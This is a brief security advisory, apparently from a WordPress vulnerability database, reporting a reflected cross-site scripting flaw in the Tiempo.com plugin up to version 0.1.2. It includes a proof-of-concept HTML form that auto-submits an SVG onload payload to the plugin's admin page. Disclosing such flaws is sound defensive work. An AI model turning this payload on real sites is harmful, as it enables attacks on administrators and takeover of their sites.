## WordPress Plugin Vulnerabilities

# Tiempo.com <= 0.1.2 - Reflected XSS

### Description

The plugin does not sanitise and escape the page parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open a page with the code below
<html>
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=tiempocom%2Fapp%2Fadmin.php" method="POST">
<input type="hidden" name="page" value='"><svg/onload=alert(/XSS/)>' />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
